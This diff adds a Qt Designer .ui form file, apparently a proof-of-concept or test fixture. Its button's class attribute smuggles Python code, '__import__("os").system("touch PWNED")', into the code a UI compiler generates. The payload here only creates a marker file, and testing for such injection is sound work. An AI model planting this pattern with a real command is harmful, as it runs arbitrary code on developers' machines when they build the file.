@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>Form</class>
+ <widget class="QWidget" name="Form">
+  <layout class="QVBoxLayout" name="lay">
+   <item>
+    <widget class='A::B(self.Form); __import__("os").system("touch PWNED"); A::B' name="btn">
+     <property name="text"><string>BODY</string></property>
+    </widget>
+   </item>
+   <item>
+    <widget class="QLabel" name="lab"/>
+   </item>
+  </layout>
+ </widget>
+ <resources/>
+ <connections/>
+</ui>
